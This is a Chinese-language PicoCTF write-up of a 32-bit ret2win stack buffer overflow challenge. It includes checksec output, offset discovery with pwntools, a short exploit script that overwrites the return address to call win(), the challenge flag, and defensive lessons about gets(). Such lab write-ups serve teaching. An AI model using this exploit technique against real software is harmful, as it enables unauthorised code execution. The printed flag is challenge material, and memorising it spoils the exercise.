---
layout: writeup
lang: zh
title: "PicoCTF - Buffer Overflow 1 (Ret2Win)"
description: "32 位二进制程序上的经典栈溢出。溢出本地缓冲区覆写返回地址，将执行流重定向到隐藏的 win 函数。"
platform: "PicoCTF"
category: "Pwn"
difficulty: "Medium"
date: 2026-02-20
permalink: /zh/ctf-writeups/picoctf-pwn-bof1/
---

## 题目信息

**平台：** PicoCTF
**类别：** 二进制漏洞利用
**难度：** Medium

## 二进制分析

```bash
file vuln
# vuln: ELF 32-bit LSB executable, not stripped

checksec vuln
# Arch: i386
# RELRO: Partial
# Stack: No canary found
# NX: disabled
# PIE: No PIE
```

无栈保护、无 PIE、NX 关闭，基本是最简单的配置。源码中 `vuln()` 使用 `gets()` 向 32 字节缓冲区读取输入，`win()` 函数会打印 flag 但从未被调用：

```c
void vuln(){
    char buf[BUFSIZE];  // BUFSIZE = 32
    gets(buf);
}
```

目标是溢出 `buf`，覆写返回地址，将其指向 `win()`。

## 确定偏移量

用 pwntools 生成循环模式，精确定位返回地址：

```python
from pwn import *

p = process('./vuln')
p.sendline(cyclic(100))
p.wait()

core = p.corefile
offset = cyclic_find(core.eip)
print(f"Offset: {offset}")  # 44
```

距离 EIP 需要 44 字节填充。

## 利用脚本

```python
from pwn import *

elf = ELF('./vuln')
p = remote('<host>', <port>)

win_addr = elf.symbols['win']

payload = b'A' * 44 + p32(win_addr)
p.sendline(payload)
p.interactive()
```

## Flag

```
picoCTF{addr3ss3s_ar3_3asy_6462ca2d}
```

## 总结

- `gets()` 不检查读取长度，不应在任何场合使用
- 没有栈金丝雀时，返回地址毫无保护
- 先跑 `checksec`，保护机制决定了使用哪种利用技术
